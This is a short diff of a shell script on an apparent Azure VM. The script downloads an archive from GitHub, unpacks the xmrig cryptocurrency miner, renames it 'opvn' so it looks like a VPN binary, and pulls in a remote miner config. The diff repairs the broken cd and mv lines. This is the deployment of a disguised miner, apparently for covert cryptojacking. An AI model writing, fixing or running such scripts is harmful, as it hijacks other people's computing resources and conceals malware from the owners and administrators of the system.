@@ -2,7 +2,8 @@ cd /home/azureuser
 wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
 tar -xzsf opme.tar.gz
 mv xmrig* opvn
-cd opvn mv xmr* opvn
+cd opvn
+mv xmr* opvn
 
 mv config.json config.json.bk
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
